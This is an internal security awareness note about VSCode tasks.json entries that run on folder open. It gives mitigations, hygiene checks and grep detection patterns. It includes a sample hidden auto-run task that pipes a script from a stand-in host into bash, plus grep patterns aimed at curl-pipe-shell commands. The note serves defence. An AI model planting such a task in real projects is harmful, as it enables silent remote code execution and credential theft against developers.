# Awareness Note: VSCode Auto-Task Execution Risk

**Date:** 2026-02-03
**Type:** Supply chain / IDE configuration
**Status:** Addressed

---

## What to Be Aware Of

VSCode supports automatic task execution via `.vscode/tasks.json`. When a task has `"runOn": "folderOpen"`, it runs silently as soon as the folder is opened — no prompt, no confirmation. Combined with hidden terminal settings, this can be used to fetch and execute remote scripts without the user noticing.

### Example of a Problematic Configuration

```json
{
    "version": "2.0.0",
    "tasks": [{
        "label": "env",
        "type": "shell",
        "command": "curl https://some-endpoint.example.com/payload | bash",
        "runOptions": {
            "runOn": "folderOpen"
        },
        "presentation": {
            "reveal": "never",
            "echo": false,
            "close": true
        }
    }]
}
```

This pattern works cross-platform (macOS, Linux, Windows) and leaves little trace.

---

## Why It Matters

If something like this ends up in a repo — through a compromised dependency, a malicious extension, or an injected git hook — anyone who opens the folder in VSCode could unknowingly execute the payload. Potential consequences include:

- **Credential exposure** — tokens, SSH keys, cloud credentials
- **Persistence** — cron jobs, launch agents, shell profile changes
- **Lateral spread** — modifications to other local repos via git hooks
- **Data leakage** — environment variables, API keys, connection strings

---

## Recommended Preventive Measures

### 1. Disable Auto Tasks in VSCode

Add this to your VSCode settings:

```json
{
    "task.allowAutomaticTasks": "off"
}
```

This is the single most effective mitigation.

### 2. Keep `.vscode` in `.gitignore`

IDE-specific configuration generally shouldn't be committed. If `.vscode` is removed from `.gitignore`, treat that as worth a closer look.

### 3. Periodic Machine Hygiene

```bash
# Check for unexpected launch agents / cron jobs
ls -la ~/Library/LaunchAgents/    # macOS
crontab -l

# Check git hooks across your repos
find ~/Projects -name ".git" -type d -exec sh -c 'ls -la "$1/hooks/" 2>/dev/null | grep -v sample' _ {} \;

# Review VSCode extensions
ls ~/.vscode/extensions/
```

### 4. Credential Rotation (If in Doubt)

```bash
gh auth logout && gh auth login
npm token revoke <token-id> && npm token create
ssh-keygen -t ed25519 -C "rotated-key"
```

---

## Detection Patterns

If you want to scan your local repos for similar configurations:

```bash
# Find tasks.json files with auto-run
find ~/Projects -name "tasks.json" -path "*/.vscode/*" -exec grep -l "runOn.*folderOpen" {} \;

# Find curl-pipe-shell patterns in JSON files
find ~/Projects -name "*.json" -exec grep -l "curl.*|.*bash\|sh\|cmd" {} \;
```

---

## Takeaways

1. `task.allowAutomaticTasks: "off"` should be your default VSCode setting
2. `.vscode` belongs in `.gitignore` — commit shared config intentionally, not by default
3. Review changes to `.gitignore` carefully, especially removals
4. "Routine" commits (version bumps, formatting) can carry unexpected changes — a quick diff goes a long way

---

**Classification:** Internal — Awareness / Prevention
